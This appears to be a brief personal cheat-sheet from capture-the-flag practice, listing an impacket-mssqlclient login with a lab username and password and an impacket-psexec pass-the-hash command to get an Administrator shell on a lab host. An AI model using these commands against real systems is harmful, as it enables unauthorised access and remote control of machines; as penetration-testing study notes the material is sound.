## mssql 

```sh
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

**note** add dc name in host file 


## psexec `to get a shell`
```sh
impacket-psexec Administrator@10.10.10.175 -hashes lm:ntlm
```
